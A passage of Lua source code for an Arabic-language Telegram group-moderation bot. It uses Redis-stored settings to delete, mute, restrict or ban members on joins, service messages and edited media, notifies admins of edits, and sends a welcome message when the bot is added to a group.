redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:JoinByLink") == "ktm" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:JoinByLink")== "kick" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
end
end
if data.message.content.luatele == "messageChatDeleteMember" or data.message.content.luatele == "messageChatAddMembers" or data.message.content.luatele == "messagePinMessage" or data.message.content.luatele == "messageChatChangeTitle" or data.message.content.luatele == "messageChatJoinByLink" then
if redis:get(bot_id..":"..data.message.chat_id..":settings:Tagservr")== "del" then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:Tagservr")== "ked" then
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:Tagservr") == "ktm" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:Tagservr")== "kick" then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
end
end 
end
if data.message.content.luatele == "messageChatAddMembers" and redis:get(bot_id..":infobot") then 
if data.message.content.member_user_ids[1] == tonumber(bot_id) then 
local photo = bot.getUserProfilePhotos(bot_id)
kup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
if photo.total_count > 0 then
bot.sendPhoto(data.message.chat_id, data.message.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*‹ : اهلا بك في بوت الحمايه\n‹ : وضيفتي حمايه المجموعات من السبام والتفليش والخ..\n‹ : لتفعيل البوت ارسل كلمه *تفعيل", 'md', nil, nil, nil, nil, nil, nil, nil, nil, nil, kup)
else
bot.sendText(data.message.chat_id,data.message.id,"*‹ : اهلا بك في بوت الحمايه \n‹ : وضيفتي حمايه المجموعات من السبام والتفليش والخ..\n‹ : لتفعيل البوت ارسل كلمه *تفعيل","md",true, false, false, false, kup)
end
end
end
end
elseif data and data.luatele and data.luatele == "updateMessageEdited" then
local msg = bot.getMessage(data.chat_id, data.message_id)
if tonumber(msg.sender.user_id) ~= tonumber(bot_id) then  
if redis:sismember(bot_id..":bot:silent", msg.sender.user_id) then    
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
end  
if redis:sismember(bot_id..":"..msg.chat_id..":silent", msg.sender.user_id) then    
bot.deleteMessages(msg.chat_id,{[1]= msg.id})  
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", msg.sender.user_id) then    
if GetInfoBot(msg).BanUser then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif GetInfoBot(msg).BanUser == false then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
end
end  
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", msg.sender.user_id) then    
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
end  
if not Administrator(msg) then
if msg.content.text then
hash = redis:sismember(bot_id.."mn:content:Text"..msg.chat_id, msg.content.text.text)
tu = "الرساله"
ut = "ممنوعه"
elseif msg.content.sticker then
hash = redis:sismember(bot_id.."mn:content:Sticker"..msg.chat_id, msg.content.sticker.sticker.remote.unique_id)
tu = "الملصق"
ut = "ممنوع"
elseif msg.content.animation then
hash = redis:sismember(bot_id.."mn:content:Animation"..msg.chat_id, msg.content.animation.animation.remote.unique_id)
tu = "المتحركه"
ut = "ممنوعه"
elseif msg.content.photo then
hash = redis:sismember(bot_id.."mn:content:Photo"..msg.chat_id, msg.content.photo.sizes[1].photo.remote.unique_id)
tu = "الصوره"
ut = "ممنوعه"
end
if hash then    
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : "..tu.." "..ut.." من المجموعه .*").yu,"md",true)  
end
end
Run(msg,data)
redis:incr(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") 
----------------------------------------------------------------------------------------------------
if not BasicConstructor(msg) then
if msg.content.luatele == "messageContact" or msg.content.luatele == "messageVideoNote" or msg.content.luatele == "messageDocument" or msg.content.luatele == "messageAudio" or msg.content.luatele == "messageVideo" or msg.content.luatele == "messageVoiceNote" or msg.content.luatele == "messageAnimation" or msg.content.luatele == "messagePhoto" then
if redis:get(bot_id..":"..msg.chat_id..":settings:Edited") then
if redis:get(bot_id..":"..msg.chat_id..":settings:Edited") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Edited") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Edited") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Edited") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
ued = bot.getUser(msg.sender.user_id)
ues = " المستخدم : ["..ued.first_name.."](tg://user?id="..msg.sender.user_id..") "
infome = bot.getSupergroupMembers(msg.chat_id, "Administrators", " .*", 0, 200)
lsme = infome.members
t = "*‹ : قام (  .*"..ues.."* ) بتعديل رسالته \nٴ━═━═━═━═━═━═━═━ \n .*"
for k, v in pairs(lsme) do
if infome.members[k].bot_info == nil then
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
t = t..""..k.."- [@"..UserInfo.username.."]\n"
else
t = t..""..k.."- ["..UserInfo.first_name.."](tg://user?id="..v.member_id.user_id..")\n"
end
end
end
if #lsme == 0 then
t = "*‹ : لا يوجد مشرفين في المجموعه .*"
end
bot.sendText(msg.chat_id,msg.id,t,"md", true)
end
end
end
end
elseif data and data.luatele and data.luatele == "updateNewCallbackQuery" then
Callback(data)
elseif data and data.luatele and data.luatele == "updateMessageSendSucceeded" then
if data.message and data.message.content then
if data.message.content.luatele == "messageUnsupported" or data.message.content.luatele == "messageSticker" or data.message.content.luatele == "messageContact" or data.message.content.luatele == "messageVideoNote" or data.message.content.luatele == "messageDocument" or data.message.content.luatele == "messageVideo" or data.message.content.luatele == "messageAnimation" or data.message.content.luatele == "messagePhoto" then
redis:sadd(bot_id..":"..data.message.chat_id..":mediaAude:ids",data.message.id)  
end
end
--
end
----------------------------------------------------------------------------------------------------
end
Runbot.run(Call)